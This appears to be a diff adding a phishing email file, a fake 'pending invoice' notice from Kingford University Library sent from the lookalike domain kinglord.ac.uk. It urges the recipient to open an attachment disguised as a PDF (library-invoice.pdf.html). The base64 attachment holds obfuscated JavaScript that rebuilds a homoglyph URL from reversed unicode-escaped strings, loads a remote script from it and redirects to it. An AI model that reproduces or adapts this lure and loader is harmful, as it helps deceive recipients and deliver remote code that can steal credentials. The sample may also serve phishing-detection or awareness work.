@@ -1,0 +1,175 @@
+Delivered-To: isabella@kingford.ac.uk
+Received: by 2002:a05:7022:e2a:b0:119:5273:6922 with SMTP id dx42csp217860dlb;
+        Tue, 4 Nov 2025 06:46:55 -0800 (PST)
+X-Received: by 2002:a17:906:5295:b0:b70:ce43:113 with SMTP id a640c23a62f3a-b70ce443f39mr636000966b.30.1762267615230;
+        Tue, 04 Nov 2025 06:46:55 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1762267615; cv=none;
+        d=kinglord.ac.uk; s=arc-20240605;
+        b=BHopKeGbF2EaIKddox+LMO08kRWGczIGa1tLrrYAhKwk7WbsnsGS0cQKRJYMqssw6D
+         du5B4U0n5zRiT25iQhXjRASjK6+yjSUdl4Y3yCAsUZ+xJzH+xBP9yYuDxIJlYwcGjfyi
+         1tC672IOx3RYNBcln5lU9GCm2pIa7aMBlNFdijpg8wPFifTYIDjq9L342ChHkeZ98IwP
+         FL1LyPIQww9TQhr/4u+WgZC4DA932DYHXloX60UM00jPoXxyElOCO5HO4ARS1XqMJf/B
+         ErkI9HI1tMICYSId9mVvLiVh71ScInBVNTgpyNEhWxffPCTUTmvU7jUoHy/1KIsf7gjJ
+         z87Q==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=kinglord.ac.uk; s=arc-20240605;
+        h=to:subject:message-id:date:from:mime-version:dkim-signature;
+        bh=eHJyIYXSdwWABXLpJYYVpVmG3UIqRqj1JS3MwUoLrF0=;
+        fh=X/71MsKVOFuVb6a2euNxQ7KQPFXo6IZb4PWyPej0WKA=;
+        b=IsQ89IJN3R2RAnjxPHdl5ykuyq0O6H3lZEgLRGSuNarNCOuDBrbqxdrLq25GLzl8nA
+         I+lXCuUgnv+fskGzCvAZSwtMEw2VAv+OjxMZOjv08hxIC/DJrJFsAP68lpcnKYWKg0Lo
+         2c1T4ytOuMplRhaLl3fLsWp+BQ3QFENm2N8tEBGdTutPYNsEp/9Nh86KrCoTHrNG5ri/
+         PfP2zzIKpqkpjm6nIZJ9mt4V00DmI4qIGV8OPxfvXQfem3o3CAPC55Xe7nM/l9e8kvNm
+         /lLMrvpZl7Doht8g/y48T35gDysb02NyIiBS4wfOIVPXzu4+Q26laKJradBnyEW0NLZ+
+         uCiw==;
+        dara=kinglord.ac.uk
+ARC-Authentication-Results: i=1; mx.kinglord.ac.uk;
+       dkim=none (no DKIM signature) header.i=@kinglord.ac.uk header.s=20230601 header.b=mMtxjIwD;
+       spf=none (kinglord.ac.uk: no SPF record) smtp.mailfrom=library@kinglord.ac.uk;
+       dmarc=none (kinglord.ac.uk: no DMARC record) header.from=kinglord.ac.uk;
+       dara=neutral header.i=@kingford.ac.uk
+Return-Path: <library@kinglord.ac.uk>
+Received: from mail-sor-f41.kinglord.ac.uk (mail-sor-f41.kinglord.ac.uk. [207.84.120.31])
+        by mx.kinglord.ac.uk with SMTPS id a640c23a62f3a-b715aee65casor170440966b.13.2025.11.04.06.46.54
+        for <isabella@kingford.ac.uk>
+        (Google Transport Security);
+        Tue, 04 Nov 2025 06:46:55 -0800 (PST)
+Received-SPF: none (kinglord.ac.uk: no SPF record) client-ip=207.84.120.31;
+Authentication-Results: mx.kinglord.ac.uk;
+       dkim=none (no DKIM signature) header.i=@kinglord.ac.uk header.s=20230601 header.b=mMtxjIwD;
+       spf=none (kinglord.ac.uk: no SPF record) smtp.mailfrom=library@kinglord.ac.uk;
+       dmarc=none (kinglord.ac.uk: no DMARC record) header.from=kinglord.ac.uk;
+       dara=neutral header.i=@kingford.ac.uk
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=kinglord.ac.uk; s=20230601; t=1762267614; x=1762872414; darn=kingford.ac.uk;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=eHJyIYXSdwWABXLpJYYVpVmG3UIqRqj1JS3MwUoLrF0=;
+        b=mMtxjIwDKk+Z9m25HVB4O72a+FNfAKg1PS3k1i/mAjUP3W37kIA82wwUUizdedsWoI
+         10rgbE6PZwMR6ZUPJwCCM/NFS+QXjLRzi7o8FOFMbw0DaKLqy1UC6V6wPkADyMAwGedx
+         76lt3mK27pLtlpZPEVj56z5Ngwy/ZCAmwv98HCVdj+/MlNH1aQGHZvL1fY0DKyMn6HKv
+         1TagqsjVcCRuVmmOgOr56F40B34HsYV9Fw4avMwYJ37WekxRK9o+EDRjCGmVdaumStVW
+         oRPXkcypPfwNbHK/ISmM4Rxe8p0i9sR69I6P01akIISgHHbLi4XSY1RwBlCRkLgatMfe
+         ZR0Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1762267614; x=1762872414;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=eHJyIYXSdwWABXLpJYYVpVmG3UIqRqj1JS3MwUoLrF0=;
+        b=IX0+7hylUTt9mJ8fGaUG0kzRQnKXXBFbzE5Z+pjeBTuuvs/6UqhHl4qB5MLC0OGAEn
+         nCxR50TU5IeJDiM/tX+VUSEb0F+ROcG6Bk4g3t4BfojBXI+RnwEknx+Gw35prrTrb+KK
+         0QXgfMndl8maJxU4f4JKNFpNcHHvmOmnPXu1JYUodiCn0Mce4CHIyXFDs9HEuHLDGYQJ
+         J1ZSfaq2cRzJI9BTr75n3ahcdO9uvyinnpCqJCcfegI4p5PZbD508qg792mLD83r4FbX
+         JcZ//rm/zzce4Sc2h/jEqIU++h3/Fy3qvF1Wn5GPVoPATHpXtQmCOPXMoT7a8vutM3e9
+         qMvg==
+X-Gm-Message-State: AOJu0YwZXzDT/HzWnMzpYhlkaJtxBC+TP3t0j4S1z2DsKVWFFa6P7WpU
+	eRS3vXYjjhStj8FVhXop38nBQN76o7P7s2B+4dvKQXGIsAXwecHQiehAEluV2/AuMFR34QGU+rT
+	PO92igOr0CFm+o+HhIcmFp/8mt9j6Qi65FdmojjQ=
+X-Gm-Gg: ASbGncvz2weBUwhhS5BJgKXbuBIfz9AHyEu3yCcq07VTAfZVrLB7vsKqsK0ghn2+Xy1
+	TpOGKNL3bvAI5JcoekRLAU31EdeKU70CPnF254XZreEm3svrshjp3p4fgfxehLwyCz0pd57mPBB
+	OnIdxYLD7gu8YuXRFXl4H2ui4ngK1R7fzIVkEVpYgmUztKwg7IZVvHQqO3vxe1BKp3m91eYvVMm
+	iP/vfnD1k0tnPWLxFxz230JhobTRIWPtXcsHFyLnEnRIJwkvfHSQ2deRLoZJQSNV+pXqtOBjjti
+	q5P+ucn1o3bBiw==
+X-Google-Smtp-Source: AGHT+IEXx8HVx22e7cYRPck0vvw6FrJatiKvUGFmCjoE7F7+6/0VpG7cPtjzDV852FyL8AO7lyeFFJ1uqvfS9YkVmpk=
+X-Received: by 2002:a17:907:7241:b0:b70:b13c:3622 with SMTP id
+ a640c23a62f3a-b70b13c60c3mr1024470066b.4.1762267614032; Tue, 04 Nov 2025
+ 06:46:54 -0800 (PST)
+MIME-Version: 1.0
+From: Kingford University Library <library@kinglord.ac.uk>
+Date: Tue, 4 Nov 2025 11:46:41 -0300
+X-Gm-Features: AWmQ_blnAvD2WRz3WEvDD-3s6R21vUSmy7KPdkqapMZCwC-ICdT2kKE6c4oEJSU
+Message-ID: <CAMBVi3X8tyPz9brTQcRO5Kvdpv_RGuUOgdAooRgSR+_GNPA+9A@mail.kinglord.ac.uk>
+Subject: Library Services - Pending Invoice
+To: "isabella@kingford.ac.uk" <isabella@kingford.ac.uk>
+Content-Type: multipart/mixed; boundary="000000000000227f970642c5e71e"
+
+--000000000000227f970642c5e71e
+Content-Type: multipart/alternative; boundary="000000000000227f960642c5e71c"
+
+--000000000000227f960642c5e71c
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Isabella,
+
+Please be informed that you have a pending invoice with The Kingford
+University Libraries System, which will expire soon. Your library
+enrollment is set to expire on *December 30, 2025, at 12:00 PM*, so this is
+a reminder to complete your payment as soon as possible.
+
+To make your payment, please open the file attached to this email and log
+in to *The Kingford University Libraries System*.
+
+You will not be required to provide any personal data during this payment
+process.
+
+Please note that the invoice renewal link is only valid for a limited time.
+If you fail to renew your library enrollment before the deadline, you will
+lose access to all online library services. For a full list of available
+services, please visit:
+*library.kingford.ac.uk*
+<http://library.kingford.ac.uk:8001>
+
+If you have any questions regarding your account status or access to
+library services, please contact the *Library Help Desk* as soon as
+possible.
+
+Sincerely,
+*Library Services*
+The Kingford University Libraries System
+=F0=9F=93=A7 helpdesk@kingford.ac.uk
+=F0=9F=8C=90 library.kingford.ac.uk
+
+--000000000000227f960642c5e71c
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+<div dir=3D"ltr"><p>Dear Isabella,</p><p>Please be informed that you have a=
+ pending invoice with The Kingford University Libraries System, which will ex=
+pire soon. Your library enrollment is set to expire on=C2=A0<strong>Decembe=
+r 30, 2025, at 12:00 PM</strong>, so this is a reminder to complete your pa=
+yment as soon as possible.</p><p>To make your payment, please open the file=
+ attached to this email and log in to=C2=A0<strong>The Kingford University Li=
+braries System</strong>.</p><p>You will not be required to provide any pers=
+onal data during this payment process.</p><p>Please note that the invoice r=
+enewal link is only valid for a limited time. If you fail to renew your lib=
+rary enrollment before the deadline, you will lose access to all online lib=
+rary services. For a full list of available services, please visit:<br><a r=
+el=3D"noopener" href=3D"http://library.kingford.ac.uk:8001" target=
+=3D"_blank"><strong>library.kingford.ac.uk</strong><span aria-hi=
+dden=3D"true"></span></a></p><p>If you have any questions regarding your ac=
+count status or access to library services, please contact the=C2=A0<strong=
+>Library Help Desk</strong>=C2=A0as soon as possible.</p><p></p><p>Sincerel=
+y,<br><strong>Library Services</strong><br>The Kingford University Libraries =
+System<br>=F0=9F=93=A7=C2=A0<a rel=3D"noopener">helpdesk@kingford=
+.ac.uk<span aria-hidden=3D"true"></span></a><br>=F0=9F=8C=90=C2=A0<a rel=
+=3D"noopener" href=3D"http://library.kingford.ac.uk:8001" target=3D=
+"_blank">library.kingford.ac.uk</a></p></div>
+
+--000000000000227f960642c5e71c--
+--000000000000227f970642c5e71e
+Content-Type: text/html; charset="US-ASCII"; name="library-invoice.pdf.html"
+Content-Disposition: attachment; filename="library-invoice.pdf.html"
+Content-Transfer-Encoding: base64
+Content-ID: <f_mhkomgd30>
+X-Attachment-Id: f_mhkomgd30
+
+PCFkb2N0eXBlIGh0bWw+CjxodG1sPgogIDxib2R5PgogICAgPHNjcmlwdD4KICAgIHZhciB4YW50
+aGl1bSA9IFsKICAgICAgIlx1MDAzMlx1MDAzOFx1MDAzMFx1MDAzOFx1MDAzYSIsICAgICAgICAg
+ICAgICAKICAgICAgIlx1MDA2ZFx1MDA2Zlx1MDA2M1x1MDAyZSIsICAgICAgICAgICAgICAgICAg
+ICAgICAgICAKICAgICAgIlx1MDAzMlx1MDAzM1x1MDAzNFx1MDAzMlx1MDAzM1x1MDA2NVx1MDA3
+N1x1MDA2M1x1MDAzM1x1MDAzMVx1MDAyZCIsCiAgICAgICJcdTAwNzVcdTAwNmNcdTAwNzRcdTAw
+NzlcdTAwNzJcdTAwNjFcdTAwNzJcdTAwNjJcdTAwNjlcdTA0NTZcdTAwNmMiLCAKICAgICAgIlx1
+MDAyZlx1MDAyZlx1MDAzYVx1MDA3MFx1MDA3NFx1MDA3NFx1MDA2OCIgICAgICAgICAgICAgIAog
+ICAgXTsKICAgIHZhciBlZ2Fzc2VtID0gWwogICAgICAiXHUwMDVlXHUwMDVlXHUwMDIwXHUwMDcz
+XHUwMDY1XHUwMDY5XHUwMDcyXHUwMDYxXHUwMDcyIiwKICAgICAgIlx1MDA2Mlx1MDA2OVx1MDA2
+Y1x1MDAyMFx1MDA2ZFx1MDA2Zlx1MDA3Mlx1MDA2Nlx1MDAyMCIsCiAgICAgICJcdTAwNzNcdTAw
+NmJcdTAwNmZcdTAwNmZcdTAwNjJcdTAwMjBcdTAwNjhcdTAwNzMiLAogICAgICAiXHUwMDY5XHUw
+MDY4XHUwMDcwXHUwMDIwXHUwMDZmXHUwMDc0XHUwMDIwIiwKICAgICAgIlx1MDA2NVx1MDA3Nlx1
+MDA2Zlx1MDA2Y1x1MDAyMFx1MDA0OSIgICAgICAKICAgIF07CgogICAgdmFyIHJldmVyc2VkID0g
+eGFudGhpdW0uam9pbigiIik7CiAgICB2YXIgc3JjID0gcmV2ZXJzZWQuc3BsaXQoIiIpLnJldmVy
+c2UoKS5qb2luKCIiKTsKCiAgICB2YXIgcmV2ZXJzZWQgPSBlZ2Fzc2VtLmpvaW4oIiIpOwogICAg
+dmFyIG1lcyA9IHJldmVyc2VkLnNwbGl0KCIiKS5yZXZlcnNlKCkuam9pbigiIik7CgogICAgZG9j
+dW1lbnQuYm9keS5hcHBlbmRDaGlsZChPYmplY3QuYXNzaWduKGRvY3VtZW50LmNyZWF0ZUVsZW1l
+bnQoInNjcmlwdCIpLCB7IHNyYzogc3JjIH0pKTsKICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNl
+KHNyYyk7CiAgICA8L3NjcmlwdD4KICA8L2JvZHk+CjwvaHRtbD4=
+--000000000000227f970642c5e71e--
